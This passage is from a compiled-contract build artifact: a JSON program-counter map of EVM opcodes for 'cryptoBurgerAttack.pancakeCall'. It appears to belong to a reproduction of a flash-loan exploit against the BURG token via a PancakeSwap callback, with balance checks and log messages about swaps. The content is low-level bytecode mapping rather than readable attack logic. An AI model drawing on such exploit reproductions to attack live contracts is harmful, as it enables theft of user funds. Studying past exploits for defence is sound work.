        4664
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x20"
    },
    "2647": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4649,
        4664
      ],
      "op": "MUL",
      "path": "0"
    },
    "2648": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4649,
        4664
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x20"
    },
    "2650": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4649,
        4664
      ],
      "op": "ADD",
      "path": "0"
    },
    "2651": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4649,
        4664
      ],
      "op": "ADD",
      "path": "0"
    },
    "2652": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4649,
        4664
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "2653": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4556,
        4674
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "2655": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4556,
        4674
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "2656": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4556,
        4674
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0xAB7"
    },
    "2659": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4556,
        4674
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "2660": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4556,
        4674
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "2661": {
      "op": "PUSH1",
      "value": "0x40"
    },
    "2663": {
      "op": "DUP1"
    },
    "2664": {
      "op": "DUP3"
    },
    "2665": {
      "op": "MSTORE"
    },
    "2666": {
      "op": "PUSH1",
      "value": "0x3C"
    },
    "2668": {
      "op": "SWAP1"
    },
    "2669": {
      "op": "DUP3"
    },
    "2670": {
      "op": "ADD"
    },
    "2671": {
      "op": "MSTORE"
    },
    "2672": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "2674": {
      "op": "DUP1"
    },
    "2675": {
      "op": "MLOAD"
    },
    "2676": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "2678": {
      "op": "PUSH2",
      "value": "0x2FDE"
    },
    "2681": {
      "op": "DUP4"
    },
    "2682": {
      "op": "CODECOPY"
    },
    "2683": {
      "op": "DUP2"
    },
    "2684": {
      "op": "MLOAD"
    },
    "2685": {
      "op": "SWAP2"
    },
    "2686": {
      "op": "MSTORE"
    },
    "2687": {
      "op": "PUSH1",
      "value": "0x60"
    },
    "2689": {
      "op": "DUP3"
    },
    "2690": {
      "op": "ADD"
    },
    "2691": {
      "op": "MSTORE"
    },
    "2692": {
      "op": "PUSH32",
      "value": "0x204255524720746F6B656E2061667465722033726420737761703A2000000000"
    },
    "2725": {
      "op": "PUSH1",
      "value": "0x80"
    },
    "2727": {
      "op": "DUP3"
    },
    "2728": {
      "op": "ADD"
    },
    "2729": {
      "op": "MSTORE"
    },
    "2730": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "2732": {
      "op": "DUP2"
    },
    "2733": {
      "op": "ADD"
    },
    "2734": {
      "op": "SWAP2"
    },
    "2735": {
      "op": "SWAP1"
    },
    "2736": {
      "op": "SWAP2"
    },
    "2737": {
      "op": "MSTORE"
    },
    "2738": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "2740": {
      "op": "ADD"
    },
    "2741": {
      "op": "SWAP1"
    },
    "2742": {
      "op": "JUMP"
    },
    "2743": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4556,
        4674
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "2744": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4556,
        4674
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "2746": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4556,
        4674
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "2747": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4556,
        4674
      ],
      "op": "DUP1",
      "path": "0"
    },
    "2748": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4556,
        4674
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "2749": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4556,
        4674
      ],
      "op": "SUB",
      "path": "0"
    },
    "2750": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4556,
        4674
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "2751": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4556,
        4674
      ],
      "op": "LOG1",
      "path": "0"
    },
    "2752": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4746,
        4760
      ],
      "op": "PUSH1",
      "path": "0",
      "statement": 21,
      "value": "0x0"
    },
    "2754": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4746,
        4760
      ],
      "op": "SLOAD",
      "path": "0"
    },
    "2755": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4746,
        4785
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "2757": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4746,
        4785
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "2758": {
      "op": "PUSH4",
      "value": "0x70A08231"
    },
    "2763": {
      "op": "PUSH1",
      "value": "0xE0"
    },
    "2765": {
      "op": "SHL"
    },
    "2766": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4746,
        4785
      ],
      "op": "DUP2",
      "path": "0"
    },
    "2767": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4746,
        4785
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "2768": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4779,
        4783
      ],
      "op": "ADDRESS",
      "path": "0"
    },
    "2769": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4746,
        4785
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "2771": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4746,
        4785
      ],
      "op": "DUP3",
      "path": "0"
    },
    "2772": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4746,
        4785
      ],
      "op": "ADD",
      "path": "0"
    },
    "2773": {
      "op": "MSTORE"
    },
    "2774": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "2776": {
      "op": "DUP1"
    },
    "2777": {
      "op": "MLOAD"
    },
    "2778": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "2780": {
      "op": "PUSH2",
      "value": "0x2FFE"
    },
    "2783": {
      "op": "DUP4"
    },
    "2784": {
      "op": "CODECOPY"
    },
    "2785": {
      "op": "DUP2"
    },
    "2786": {
      "op": "MLOAD"
    },
    "2787": {
      "op": "SWAP2"
    },
    "2788": {
      "op": "MSTORE"
    },
    "2789": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4689,
        4795
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "2790": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "2792": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "2794": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "2796": {
      "op": "SHL"
    },
    "2797": {
      "op": "SUB"
    },
    "2798": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4746,
        4760
      ],
      "op": "AND",
      "path": "0"
    },
    "2799": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4746,
        4760
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "2800": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4746,
        4770
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0x70A08231"
    },
    "2805": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4746,
        4770
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "2806": {
      "op": "PUSH1",
      "value": "0x24"
    },
    "2808": {
      "op": "ADD"
    },
    "2809": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4746,
        4785
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x20"
    },
    "2811": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4746,
        4785
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "2813": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4746,
        4785
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "2814": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4746,
        4785
      ],
      "op": "DUP1",
      "path": "0"
    },
    "2815": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4746,
        4785
      ],
      "op": "DUP4",
      "path": "0"
    },
    "2816": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4746,
        4785
      ],
      "op": "SUB",
      "path": "0"
    },
    "2817": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4746,
        4785
      ],
      "op": "DUP2",
      "path": "0"
    },
    "2818": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4746,
        4785
      ],
      "op": "DUP7",
      "path": "0"
    },
    "2819": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4746,
        4785
      ],
      "op": "GAS",
      "path": "0"
    },
    "2820": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4746,
        4785
      ],
      "op": "STATICCALL",
      "path": "0"
    },
    "2821": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4746,
        4785
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "2822": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4746,
        4785
      ],
      "op": "DUP1",
      "path": "0"
    },
    "2823": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4746,
        4785
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "2824": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4746,
        4785
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0xB15"
    },
    "2827": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4746,
        4785
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "2828": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4746,
        4785
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "2829": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4746,
        4785
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "2831": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4746,
        4785
      ],
      "op": "DUP1",
      "path": "0"
    },
    "2832": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4746,
        4785
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "2833": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4746,
        4785
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "2834": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4746,
        4785
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "2836": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4746,
        4785
      ],
      "op": "REVERT",
      "path": "0"
    },
    "2837": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4746,
        4785
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "2838": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4746,
        4785
      ],
      "op": "POP",
      "path": "0"
    },
    "2839": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4746,
        4785
      ],
      "op": "POP",
      "path": "0"
    },
    "2840": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4746,
        4785
      ],
      "op": "POP",
      "path": "0"
    },
    "2841": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4746,
        4785
      ],
      "op": "POP",
      "path": "0"
    },
    "2842": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4746,
        4785
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "2844": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4746,
        4785
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "2845": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4746,
        4785
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "2846": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4746,
        4785
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "2848": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4746,
        4785
      ],
      "op": "NOT",
      "path": "0"
    },
    "2849": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4746,
        4785
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "2851": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4746,
        4785
      ],
      "op": "DUP3",
      "path": "0"
    },
    "2852": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4746,
        4785
      ],
      "op": "ADD",
      "path": "0"
    },
    "2853": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4746,
        4785
      ],
      "op": "AND",
      "path": "0"
    },
    "2854": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4746,
        4785
      ],
      "op": "DUP3",
      "path": "0"
    },
    "2855": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4746,
        4785
      ],
      "op": "ADD",
      "path": "0"
    },
    "2856": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4746,
        4785
      ],
      "op": "DUP1",
      "path": "0"
    },
    "2857": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4746,
        4785
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "2859": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4746,
        4785
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "2860": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4746,
        4785
      ],
      "op": "POP",
      "path": "0"
    },
    "2861": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4746,
        4785
      ],
      "op": "DUP2",
      "path": "0"
    },
    "2862": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4746,
        4785
      ],
      "op": "ADD",
      "path": "0"
    },
    "2863": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4746,
        4785
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "2864": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4746,
        4785
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0xB39"
    },
    "2867": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4746,
        4785
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "2868": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4746,
        4785
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "2869": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4746,
        4785
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2DCC"
    },
    "2872": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        4746,
        4785
      ],
      "op": "JUMP",
      "path": "0"
    },
    "2873": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4746,
        4785
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "2874": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4689,
        4795
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "2876": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4689,
        4795
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "2877": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4689,
        4795
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0xB46"
    },
    "2880": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4689,
        4795
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "2881": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4689,
        4795
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "2882": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4689,
        4795
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2DE5"
    },
    "2885": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        4689,
        4795
      ],
      "op": "JUMP",
      "path": "0"
    },
    "2886": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4689,
        4795
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "2887": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4689,
        4795
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "2889": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4689,
        4795
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "2890": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4689,
        4795
      ],
      "op": "DUP1",
      "path": "0"
    },
    "2891": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4689,
        4795
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "2892": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4689,
        4795
      ],
      "op": "SUB",
      "path": "0"
    },
    "2893": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4689,
        4795
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "2894": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4689,
        4795
      ],
      "op": "LOG1",
      "path": "0"
    },
    "2895": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4805,
        4869
      ],
      "op": "PUSH2",
      "path": "0",
      "statement": 22,
      "value": "0xB82"
    },
    "2898": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "2900": {
      "op": "DUP1"
    },
    "2901": {
      "op": "MLOAD"
    },
    "2902": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "2904": {
      "op": "PUSH2",
      "value": "0x2F9E"
    },
    "2907": {
      "op": "DUP4"
    },
    "2908": {
      "op": "CODECOPY"
    },
    "2909": {
      "op": "DUP2"
    },
    "2910": {
      "op": "MLOAD"
    },
    "2911": {
      "op": "SWAP2"
    },
    "2912": {
      "op": "MSTORE"
    },
    "2913": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "2915": {
      "op": "DUP1"
    },
    "2916": {
      "op": "MLOAD"
    },
    "2917": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "2919": {
      "op": "PUSH2",
      "value": "0x2F7E"
    },
    "2922": {
      "op": "DUP4"
    },
    "2923": {
      "op": "CODECOPY"
    },
    "2924": {
      "op": "DUP2"
    },
    "2925": {
      "op": "MLOAD"
    },
    "2926": {
      "op": "SWAP2"
    },
    "2927": {
      "op": "MSTORE"
    },
    "2928": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4826,
        4838
      ],
      "op": "DUP4",
      "path": "0"
    },
    "2929": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4839,
        4840
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "2931": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4826,
        4841
      ],
      "op": "DUP2",
      "path": "0"
    },
    "2932": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4826,
        4841
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "2933": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4826,
        4841
      ],
      "op": "DUP2",
      "path": "0"
    },
    "2934": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4826,
        4841
      ],
      "op": "LT",
      "path": "0"
    },
    "2935": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4826,
        4841
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x614"
    },
    "2938": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4826,
        4841
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "2939": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4826,
        4841
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x614"
    },
    "2942": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4826,
        4841
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2C93"
    },
    "2945": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        4826,
        4841
      ],
      "op": "JUMP",
      "path": "0"
    },
    "2946": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4805,
        4869
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "2947": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4894,
        5001
      ],
      "op": "PUSH1",
      "path": "0",
      "statement": 23,
      "value": "0x40"
    },
    "2949": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4894,
        5001
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "2950": {
      "op": "PUSH4",
      "value": "0x7C0329D"
    },
    "2955": {
      "op": "PUSH1",
      "value": "0xE2"
    },
    "2957": {
      "op": "SHL"
    },
    "2958": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4894,
        5001
      ],
      "op": "DUP2",
      "path": "0"
    },
    "2959": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4894,
        5001
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "2960": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "2962": {
      "op": "DUP1"
    },
    "2963": {
      "op": "MLOAD"
    },
    "2964": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "2966": {
      "op": "PUSH2",
      "value": "0x2FBE"
    },
    "2969": {
      "op": "DUP4"
    },
    "2970": {
      "op": "CODECOPY"
    },
    "2971": {
      "op": "DUP2"
    },
    "2972": {
      "op": "MLOAD"
    },
    "2973": {
      "op": "SWAP2"
    },
    "2974": {
      "op": "MSTORE"
    },
    "2975": {
      "offset": [
        526,
        568
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "2976": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4894,
        4944
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0x1F00CA74"
    },
    "2981": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4894,
        4944
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "2982": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4894,
        5001
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0xBB5"
    },
    "2985": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4894,
        5001
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "2986": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4958,
        4973
      ],
      "op": "DUP7",
      "path": "0"
    },
    "2987": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4958,
        4973
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "2988": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4987,
        4991
      ],
      "op": "DUP7",
      "path": "0"
    },
    "2989": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4987,
        4991
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "2990": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4894,
        5001
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "2992": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4894,
        5001
      ],
      "op": "ADD",
      "path": "0"
    },
    "2993": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4894,
        5001
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2CED"
    },
    "2996": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        4894,
        5001
      ],
      "op": "JUMP",
      "path": "0"
    },
    "2997": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4894,
        5001
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "2998": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4894,
        5001
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "3000": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4894,
        5001
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "3002": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4894,
        5001
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "3003": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4894,
        5001
      ],
      "op": "DUP1",
      "path": "0"
    },
    "3004": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4894,
        5001
      ],
      "op": "DUP4",
      "path": "0"
    },
    "3005": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4894,
        5001
      ],
      "op": "SUB",
      "path": "0"
    },
    "3006": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4894,
        5001
      ],
      "op": "DUP2",
      "path": "0"
    },
    "3007": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4894,
        5001
      ],
      "op": "DUP7",
      "path": "0"
    },
    "3008": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4894,
        5001
      ],
      "op": "GAS",
      "path": "0"
    },
    "3009": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4894,
        5001
      ],
      "op": "STATICCALL",
      "path": "0"
    },
    "3010": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4894,
        5001
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "3011": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4894,
        5001
      ],
      "op": "DUP1",
      "path": "0"
    },
    "3012": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4894,
        5001
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "3013": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4894,
        5001
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0xBD2"
    },
    "3016": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4894,
        5001
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "3017": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4894,
        5001
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "3018": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4894,
        5001
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "3020": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4894,
        5001
      ],
      "op": "DUP1",
      "path": "0"
    },
    "3021": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4894,
        5001
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "3022": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4894,
        5001
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "3023": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4894,
        5001
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "3025": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4894,
        5001
      ],
      "op": "REVERT",
      "path": "0"
    },
    "3026": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4894,
        5001
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "3027": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4894,
        5001
      ],
      "op": "POP",
      "path": "0"
    },
    "3028": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4894,
        5001
      ],
      "op": "POP",
      "path": "0"
    },
    "3029": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4894,
        5001
      ],
      "op": "POP",
      "path": "0"
    },
    "3030": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4894,
        5001
      ],
      "op": "POP",
      "path": "0"
    },
    "3031": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4894,
        5001
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "3033": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4894,
        5001
      ],
      "op": "MLOAD",
      "path": "0"
